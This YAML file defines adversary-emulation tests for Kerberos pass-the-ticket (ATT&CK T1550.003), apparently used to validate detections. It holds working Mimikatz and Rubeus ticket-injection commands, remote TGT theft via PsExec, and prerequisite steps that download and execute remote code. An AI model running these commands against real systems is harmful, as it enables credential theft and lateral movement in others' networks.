attack_technique: T1550.003
display_name: 'Use Alternate Authentication Material: Pass the Ticket'
atomic_tests:
    - name: Mimikatz Kerberos Ticket Attack
      item_id: T1550.003-1
      auto_generated_guid: dbf38128-7ba7-4776-bedf-cc2eed432098
      description: |
        Similar to PTH, but attacking Kerberos
      supported_platforms:
        - windows
      input_arguments:
        mimikatz_exe:
            description: Path of the Mimikatz binary
            type: path
            default: PathToAtomicsFolder\T1550.003\bin\x64\mimikatz.exe
        ticket:
            description: Ticket file name usually format of 'id-username\@domain.kirbi' (e.g. can be dumped by "sekurlsa::tickets /export" module)
            type: string
            default: ""
      dependency_executor_name: powershell
      dependencies:
        - description: |
            Mimikatz must exist on disk at specified location (#{mimikatz_exe})
          prereq_command: |
            if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
          get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path #{mimikatz_exe} | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
      executor:
        command: |
            #{mimikatz_exe} "kerberos::ptt #{ticket}"
        cleanup_command: ""
        name: command_prompt
        elevation_required: false
    - name: Rubeus Kerberos Pass The Ticket
      item_id: T1550.003-2
      auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
      description: |
        Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
        PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.
      supported_platforms:
        - windows
      input_arguments:
        domain:
            description: domain
            type: string
            default: $Env:USERDOMAIN
        password:
            description: password for user_name
            type: string
            default: Password
        psexec_path:
            description: Path of the PsExec binary
            type: string
            default: C:\PSTools\PsExec.exe
        rubeus_path:
            description: Path of the Rubeus binary
            type: path
            default: $Env:TEMP\rubeus.exe
        rubeus_url:
            description: URL of Rubeus executable
            type: url
            default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
        target:
            description: Remote system to request the TGT from
            type: string
            default: localhost
        user_name:
            description: username associated with the ticket (privileged account not required)
            type: string
            default: Administrator
      dependency_executor_name: powershell
      dependencies:
        - description: |
            Rubeus must exist on disk at specified location (#{rubeus_path})
          prereq_command: |
            if (Test-Path #{rubeus_path}) {exit 0} else {exit 1}
          get_prereq_command: |
            Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{rubeus_path}
        - description: |
            PsExec must exist on disk at specified location (#{psexec_path})
          prereq_command: |
            if (Test-Path #{psexec_path}) {exit 0} else {exit 1}
          get_prereq_command: |
            Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
            Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
            New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
            Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
      executor:
        command: "#{psexec_path} -accepteula \\\\#{target} -w c:\\ -c #{rubeus_path} asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location $env:TEMP\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host \"Successfully retrieved TGT from '#{target}', now requesting a TGS from local\"\n& \"#{rubeus_path}\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt\nRemove-Item $env:TEMP\\ticket.kirbi\n& \"#{rubeus_path}\" purge      \n"
        cleanup_command: ""
        name: powershell
        elevation_required: true
